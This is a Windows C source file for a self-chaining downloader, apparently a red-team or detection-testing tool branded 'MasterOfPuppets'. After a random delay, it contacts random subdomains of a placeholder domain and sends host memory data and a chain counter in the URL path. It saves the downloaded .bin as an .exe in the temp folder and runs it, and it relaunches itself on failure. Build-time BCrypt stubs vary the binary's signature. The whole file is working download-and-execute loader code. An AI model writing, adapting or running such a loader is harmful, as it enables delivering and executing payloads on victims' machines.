//params
#define DOMAINNAME "mop.samplefakedomain.com"
#define UASTRINGA "MasterOfPuppets/5.0"

//defaults if didn't come during build
#ifndef REFERERDEFA
#define REFERERDEFA "/FakeReferer.html"
#endif
#ifndef THREAD1STR
#define THREAD1STR "1234"
#define THREAD2STR "5678"
#endif

#define MSECSINSEC 1000
#define LETTERCOUNT ((int)('Z') - (int)('A') + 1)
#define MAXREFERERSIZE 512
#define MAXUASIZE 512
#define MAXPART 256

#define WIN32_LEAN_AND_MEAN 1
#undef UNICODE
#include <Windows.h>
#include <stdlib.h>
#include <strsafe.h>

#ifdef _MSC_VER
#include <bcrypt.h>
#include <winhttp.h>
#pragma  comment(lib,"Bcrypt.lib")
#pragma  comment(lib,"ntdll.lib")
#pragma comment (lib,"winhttp.lib")
#endif


#define ISO_TIME_LEN 32 //some spare bytes
#define ISO_TIME_FORMAT  "%02i%02i%02i%02i%02i%02i%03i"

#define Add2Ptr(Ptr,Inc) ((PVOID)((PUCHAR)(Ptr) + (Inc)))

#define LEAVE_AND_REPEAT_IF_FALSE(x) if (!(x)) \
{ \
	Sleep(dwWaitSeconds* MSECSINSEC); \
	dwWaitSeconds *= 2; \
	printf("ERROR %lu in #%i\r\n", GetLastError(), __LINE__); \
	goto finale; \
}

typedef enum _SYSTEM_INFORMATION_CLASS
{
	SystemMemoryUsageInformation = 182
} SYSTEM_INFORMATION_CLASS;

#ifdef _MSC_VER
__declspec(dllimport) void WINAPI RtlGetNtVersionNumbers(PULONG pNtMajorVersion, PULONG pNtMinorVersion,
                                                         PULONG pNtBuildNumber);
NTSTATUS NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass,
                                  PVOID SystemInformation, ULONG SystemInformationLength,
                                  PULONG ReturnLength);
#else
typedef LPVOID HINTERNET;
#define WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY 4
#define WINHTTP_NO_PROXY_NAME NULL
#define WINHTTP_NO_PROXY_BYPASS NULL
#define INTERNET_DEFAULT_PORT 0
#define WINHTTP_NO_ADDITIONAL_HEADERS NULL
#define WINHTTP_NO_REQUEST_DATA NULL
#define WINHTTP_QUERY_STATUS_CODE 19
#define WINHTTP_QUERY_FLAG_NUMBER 0x20000000
#define WINHTTP_HEADER_NAME_BY_INDEX NULL
#define WINHTTP_NO_HEADER_INDEX NULL
#define _MAX_FNAME 256

#endif

char g_StartTimeAStr[ISO_TIME_LEN] = {0};
WCHAR g_Random4WStr[4 + 1];

VOID InitGStartTimeWithSystemTime(SYSTEMTIME stTime)
{
	PSTR pszISOTimeZ;
	pszISOTimeZ = g_StartTimeAStr;
	StringCbPrintfA(
		pszISOTimeZ,
		ISO_TIME_LEN + 3,
		ISO_TIME_FORMAT,
		stTime.wYear - 2000,
		stTime.wMonth,
		stTime.wDay,
		stTime.wHour,
		stTime.wMinute,
		stTime.wSecond,
		stTime.wMilliseconds);
}

typedef struct _SYSTEM_MEMORY_USAGE_INFORMATION
{
	ULONG64 TotalPhysicalBytes;
	ULONG64 AvailableBytes;
	LONG64 ResidentAvailableBytes;
	ULONG64 CommittedBytes;
	ULONG64 SharedCommittedBytes;
	ULONG64 CommitLimitBytes;
	ULONG64 PeakCommitmentBytes;
} SYSTEM_MEMORY_USAGE_INFORMATION, *PSYSTEM_MEMORY_USAGE_INFORMATION;


typedef struct _KSYSTEM_TIME
{
	ULONG LowPart;
	LONG High1Time;
	LONG High2Time;
} KSYSTEM_TIME, *PKSYSTEM_TIME;


typedef struct my_KUSER_SHARED_DATA
{
	ULONG TickCountLowDeprecated;
	ULONG TickCountMultiplier;
	KSYSTEM_TIME InterruptTime;
	KSYSTEM_TIME SystemTime;
	KSYSTEM_TIME TimeZoneBias;
} my_kuser;

const void* pKuserSharedData = (PVOID)0x7ffe0000;

VOID InitGStartTimeStr(void)
{
	my_kuser mku;
	SYSTEMTIME stTime;

	//avoiding GetSystemTime(&stTime) to make it fancier
	CopyMemory(&mku, pKuserSharedData, sizeof(mku));
	FileTimeToSystemTime((FILETIME*)&(mku.SystemTime), &stTime);

	InitGStartTimeWithSystemTime(stTime);
}


PWSTR InitGRandom4WStr(void)
{
	char c1;
	char c2;
	char c3;
	char c4;

	c1 = (char)((int)('a') + rand() % LETTERCOUNT);
	c2 = (char)((int)('a') + rand() % LETTERCOUNT);
	c3 = (char)((int)('a') + rand() % LETTERCOUNT);
	c4 = (char)((int)('a') + rand() % LETTERCOUNT);

	StringCbPrintfW(g_Random4WStr, sizeof(g_Random4WStr), L"%c%c%c%c", c1, c2, c3, c4);
	return g_Random4WStr;
}


PWSTR GenerateServerPart(void)
{
	PWSTR pwszRes;
	pwszRes = HeapAlloc(GetProcessHeap(), 0, MAXPART);
	if (!pwszRes)
	{
		return NULL; // will relaunch the app
	}

	//no countof in tcc
	WCHAR pwszAux1[sizeof(g_Random4WStr) / sizeof(WCHAR)];
	WCHAR pwszAux2[sizeof(g_Random4WStr) / sizeof(WCHAR)];

	InitGRandom4WStr();
	memcpy(pwszAux1, g_Random4WStr, sizeof(g_Random4WStr));
	InitGRandom4WStr();
	memcpy(pwszAux2, g_Random4WStr, sizeof(g_Random4WStr));

	StringCbPrintfW(
		pwszRes,
		HeapSize(GetProcessHeap(), 0, pwszRes),
		L"%ls.%ls.%hs",
		pwszAux1,
		pwszAux2,
		DOMAINNAME);

	return HeapReAlloc(GetProcessHeap(), 0, pwszRes, (wcslen(pwszRes) + 1) * sizeof(WCHAR));
}

PWSTR GenerateObjectPart(int iChain)
{
	PWSTR pwszRes;
	pwszRes = HeapAlloc(GetProcessHeap(), 0, MAXPART);
	if (!pwszRes)
	{
		return NULL; // will relaunch the app
	}

	SYSTEM_MEMORY_USAGE_INFORMATION MemInfo = {0};
	NtQuerySystemInformation(SystemMemoryUsageInformation, &MemInfo, sizeof(MemInfo), NULL);

	InitGRandom4WStr();

	char pszTh1[4 + 1] = {0};
	char pszTh2[4 + 1] = {0};

	if (0 == strcmp(THREAD1STR, "1234"))
	{
		for (int i = 0; i < 4; i++)
		{
			pszTh1[i] = (char)((int)('a') + rand() % LETTERCOUNT);
		}
	}
	else
	{
		memcpy(pszTh1, THREAD1STR, sizeof(THREAD1STR));
	}

	if (0 == strcmp(THREAD2STR, "5678"))
	{
		for (int i = 0; i < 4; i++)
		{
			pszTh2[i] = (char)((int)('a') + rand() % LETTERCOUNT);
		}
	}
	else
	{
		memcpy(pszTh2, THREAD2STR, sizeof(THREAD2STR));
	}


	StringCbPrintfW(
		pwszRes,
		HeapSize(GetProcessHeap(), 0, pwszRes),
		L"/v5/%hs/%hs/%hs/%06llx%06llx/%06x/%ls.bin",
		pszTh1,
		pszTh2,
		g_StartTimeAStr,
		(MemInfo.AvailableBytes >> 20),
		(MemInfo.TotalPhysicalBytes >> 20),
		iChain,
		g_Random4WStr);

	return HeapReAlloc(GetProcessHeap(), 0, pwszRes, (wcslen(pwszRes) + 1) * sizeof(WCHAR));
}

BOOL DoDownload(PWSTR pwszServerName, PWSTR pwszObjectName, PWSTR pwszFileName)
{
	PWCHAR pwszReferer;
	PWCHAR pwszUserAgent;

	HINTERNET hSession;
	HINTERNET hConnection;
	HINTERNET hRequest;

	PVOID pContentBufer;

	DWORD dwWaitSeconds;
	BOOL bSuccess;

	ULONG ulMajorVersion = 0;
	ULONG ulMinorVersion = 0;
	ULONG ulBuildNumber = 0;

	pwszReferer = NULL;
	pwszUserAgent = NULL;
	hSession = NULL;
	hConnection = NULL;
	hRequest = NULL;
	pContentBufer = NULL;
	dwWaitSeconds = 1;
	bSuccess = FALSE;

	RtlGetNtVersionNumbers(&ulMajorVersion, &ulMinorVersion, &ulBuildNumber);

	while (!bSuccess)
	{
		HANDLE hFile;
		hFile = CreateFileW(
			pwszFileName,
			GENERIC_WRITE,
			0,
			NULL,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_TEMPORARY,
			NULL);
		if (INVALID_HANDLE_VALUE == hFile)
		{
			printf("ERROR %lu in #%i\r\n", GetLastError(), __LINE__);
			return FALSE;
		}

		pwszReferer = HeapAlloc(GetProcessHeap(), 0, MAXREFERERSIZE);
		LEAVE_AND_REPEAT_IF_FALSE(pwszReferer);

		StringCbPrintfW(pwszReferer, HeapSize(GetProcessHeap(), 0, pwszReferer), L"%hs", REFERERDEFA);

		pwszUserAgent = HeapAlloc(GetProcessHeap(), 0, MAXUASIZE);
		LEAVE_AND_REPEAT_IF_FALSE(pwszUserAgent);
		StringCbPrintfW(
			pwszUserAgent,
			HeapSize(GetProcessHeap(), 0, pwszUserAgent),
			L"%hs+(Windows+NT+%i.%i.%i)",
			UASTRINGA,
			ulMajorVersion,
			ulMinorVersion,
			ulBuildNumber & 0xFFFFU);

		hSession = WinHttpOpen(
			pwszUserAgent,
			WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
			WINHTTP_NO_PROXY_NAME,
			WINHTTP_NO_PROXY_BYPASS,
			0);

		LEAVE_AND_REPEAT_IF_FALSE(hSession);

		hConnection = WinHttpConnect(hSession, pwszServerName, INTERNET_DEFAULT_PORT, 0);
		LEAVE_AND_REPEAT_IF_FALSE(hConnection);

		LPCWSTR szAccept[] = {L"*/*", NULL}; //hardcoded *.* seems to be good enough

		hRequest = WinHttpOpenRequest(hConnection, NULL, pwszObjectName, NULL, pwszReferer, szAccept, 0);
		LEAVE_AND_REPEAT_IF_FALSE(hRequest);

		BOOL bRes;

		bRes = WinHttpSendRequest(
			hRequest,
			WINHTTP_NO_ADDITIONAL_HEADERS,
			0,
			WINHTTP_NO_REQUEST_DATA,
			0,
			0,
			0);
		LEAVE_AND_REPEAT_IF_FALSE(bRes);

		bRes = WinHttpReceiveResponse(hRequest, NULL);
		LEAVE_AND_REPEAT_IF_FALSE(bRes);

		DWORD dwStatusCode = 0;
		DWORD dwSize = sizeof(dwStatusCode);

		bRes = WinHttpQueryHeaders(
			hRequest,
			WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
			WINHTTP_HEADER_NAME_BY_INDEX,
			&dwStatusCode,
			&dwSize,
			WINHTTP_NO_HEADER_INDEX);
		LEAVE_AND_REPEAT_IF_FALSE(bRes);
		LEAVE_AND_REPEAT_IF_FALSE(dwStatusCode < 500);

		DWORD dwAvailable;
		bRes = WinHttpQueryDataAvailable(hRequest, &dwAvailable);
		LEAVE_AND_REPEAT_IF_FALSE(bRes);

		//cannot be 0
		LEAVE_AND_REPEAT_IF_FALSE(0 != dwAvailable);

		while (dwAvailable != 0)
		{
			pContentBufer = HeapAlloc(GetProcessHeap(), 0, dwAvailable);
			LEAVE_AND_REPEAT_IF_FALSE(pContentBufer);

			DWORD dwRead;
			bRes = WinHttpReadData(hRequest, pContentBufer, dwAvailable, &dwRead);
			LEAVE_AND_REPEAT_IF_FALSE(bRes);

			DWORD dwWritten;
			bRes = WriteFile(hFile, pContentBufer, dwRead, &dwWritten, NULL);
			if (!bRes)
			{
				printf("ERROR %lu in #%i\r\n", GetLastError(), __LINE__);
				break; //out of inner while, success equals false, file will be re-created with the same name.
			}
			if (pContentBufer)
			{
				HeapFree(GetProcessHeap(), 0, pContentBufer);
				pContentBufer = NULL;
			}

			bRes = WinHttpQueryDataAvailable(hRequest, &dwAvailable);
			LEAVE_AND_REPEAT_IF_FALSE(bRes);
		}
		bSuccess = bRes;

	finale:
		if (INVALID_HANDLE_VALUE != hFile)
		{
			CloseHandle(hFile);
		}
		if (pContentBufer)
		{
			HeapFree(GetProcessHeap(), 0, pContentBufer);
			pContentBufer = NULL;
		}
		if (hRequest)
		{
			WinHttpCloseHandle(hRequest);
		}
		if (hConnection)
		{
			WinHttpCloseHandle(hConnection);
		}
		if (hSession)
		{
			WinHttpCloseHandle(hSession);
		}
		if (pwszUserAgent)
		{
			HeapFree(GetProcessHeap(), 0, pwszUserAgent);
		}
		if (pwszReferer)
		{
			HeapFree(GetProcessHeap(), 0, pwszReferer);
		}
	} //while
	return bSuccess;
}


//int main(void)
int main(int argc, char* argv[])
{
	//printf("#%i\r\n", __LINE__);

	PULARGE_INTEGER pulTimer = Add2Ptr(pKuserSharedData, 0x14);
	srand(pulTimer->LowPart);

	InitGStartTimeStr();

	SleepEx(4096 + (rand() % 1024), FALSE);

	int iChain;
	iChain = 0;
	if (argc > 1)
	{
		iChain = strtol(argv[1], NULL, 16);
	}

	PWSTR pwszServerName;
	pwszServerName = GenerateServerPart();

	PWSTR pwszObjectName;
	pwszObjectName = GenerateObjectPart(iChain);

	if (!pwszObjectName || !pwszServerName)
	{
		//retry
		printf("Retrying %ls\r\n", GetCommandLineW());
		_wsystem(GetCommandLineW());
		return 0;
	}

	WCHAR pwszDest[MAX_PATH] = {0};
	WCHAR pwszEnvDest[MAX_PATH] = {0};
	StringCbPrintfW(pwszEnvDest, sizeof(pwszEnvDest), L"%%tmp%%\\%hs.exe", g_StartTimeAStr);

	//no countof, func requires num of wchars
	ExpandEnvironmentStringsW(pwszEnvDest, pwszDest, (sizeof(pwszDest) / sizeof(WCHAR)));

	printf("http://%ls%ls --> %ls\r\n", pwszServerName, pwszObjectName, pwszDest);

	BOOL bRes;
	bRes = DoDownload(pwszServerName, pwszObjectName, pwszDest);

	WCHAR pwszCmdLine[MAX_PATH] = {0}; //should be enough even with params
	StringCbPrintfW(pwszCmdLine, sizeof(pwszCmdLine), L"%s %06x", pwszDest, iChain + 1);

	if (bRes)
	{
		//child
		SleepEx(4096 + (rand() % 1024), FALSE);
		_wsystem(pwszCmdLine);
	}
	else
	{
		//retry
		printf("Retrying %ls\r\n", GetCommandLineW());
		_wsystem(GetCommandLineW());
	}


	// variable part at the very end to make code run even if this part fails.
	// defines below are set during compilation

#ifdef randomstring
	printf("Grupa Sendbajt, User Id: %s\r\n", randomstring);
#endif

#pragma warning( disable : 6387)
#ifdef d0
	printf("d0=%s, executing... ", d0);
	(void)BCryptEnumContexts(0, 0, 0);
	printf("Done.\r\n");
#endif

#ifdef d1
	printf("d1=%s, executing... ", d1);
	(void)BCryptEnumProviders(0, 0, 0, 0);
	printf("Done.\r\n");
#endif

#ifdef d2
	printf("d2=%s, executing... ", d2);
	(void)BCryptEnumRegisteredProviders(0, 0);
	printf("Done.\r\n");
#endif

#ifdef d3
	printf("d3=%s, executing... ", d3);
	(void)BCryptFinalizeKeyPair(0, 0);
	printf("Done.\r\n");
#endif

#ifdef d4
	printf("d4=%s, executing... ", d4);
	(void)BCryptFinishHash(0, 0, 0, 0);
	printf("Done.\r\n");
#endif

#ifdef d5
	printf("d5=%s, executing... ", d5);
	(void)BCryptFreeBuffer(0);
	printf("Done.\r\n");
#endif

#ifdef d6
	printf("d6=%s, executing... ", d6);
	(void)BCryptGenerateKeyPair(0, 0, 0, 0);
	printf("Done.\r\n");
#endif

#ifdef d7
	printf("d7=%s, executing... ", d7);
	(void)BCryptGenRandom(0, 0, 0, 0);
	printf("Done.\r\n");
#endif

#ifdef d8
	printf("d8=%s, executing... ", d8);
	(void)BCryptGetFipsAlgorithmMode(0);
	printf("Done.\r\n");
#endif

#ifdef d9
	printf("d9=%s, executing... ", d9);
	(void)BCryptGenRandom(0, 0, 0, 0);
	printf("Done.\r\n");
#endif

#ifdef da
	printf("da=%s, executing... ", da);
	(void)BCryptHashData(0, 0, 0, 0);
	printf("Done.\r\n");
#endif

#ifdef db
	printf("db=%s, executing... ", db);
	(void)BCryptOpenAlgorithmProvider(0, 0, 0, 0);
	printf("Done.\r\n");
#endif

#ifdef dc
	printf("dc=%s, executing... ", dc);
	(void)BCryptQueryContextConfiguration(0, 0, 0, 0);
	printf("Done.\r\n");
#endif

#ifdef dd
	printf("dd=%s, executing... ", dd);
	(void)BCryptRegisterConfigChangeNotify(0);
	printf("Done.\r\n");
#endif

#ifdef de
	printf("de=%s, executing... ", de);
	(void)BCryptRemoveContextFunction(0, 0, 0, 0);
	printf("Done.\r\n");
#endif

#ifdef df
	printf("df=%s, executing... ", df);
	(void)BCryptSecretAgreement(0, 0, 0, 0);
	printf("Done.\r\n");
#endif
#pragma warning(default:6387)


	return 0;
}
